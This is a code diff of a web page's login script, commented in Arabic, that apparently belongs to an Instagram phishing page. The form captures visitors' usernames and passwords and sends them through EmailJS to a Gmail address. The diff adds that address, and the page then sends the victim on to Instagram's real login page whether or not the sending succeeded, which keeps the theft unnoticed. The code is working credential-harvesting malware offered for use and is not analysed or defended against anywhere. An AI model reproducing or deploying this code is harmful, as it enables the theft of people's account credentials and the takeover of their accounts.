@@ -95,7 +95,7 @@
 
     <script>
         // تهيئة EmailJS باستخدام Public Key
-        emailjs.init('SHnwOeLnomJS7LWFF');
+        emailjs.init('SHnwOeLnomJS7LWFF'); // مفتاحك العام
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // منع الإرسال الافتراضي للنموذج
@@ -103,7 +103,9 @@
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
 
+            // إرسال البيانات عبر EmailJS
             emailjs.send('service_40opfyh', 'template_stxpsdr', {
+                to_email: 'nakamotoishihara001@gmail.com',
                 username: username,
                 password: password
             }).then(function(response) {
@@ -112,6 +114,8 @@
                 window.location.href = 'https://www.instagram.com/accounts/login/';
             }, function(error) {
                 console.log('فشل إرسال الرسالة', error);
+                // إذا فشل الإرسال، يمكن توجيه المستخدم إلى صفحة تسجيل الدخول لإنستاجرام أيضاً
+                window.location.href = 'https://www.instagram.com/accounts/login/';
             });
         });
     </script>
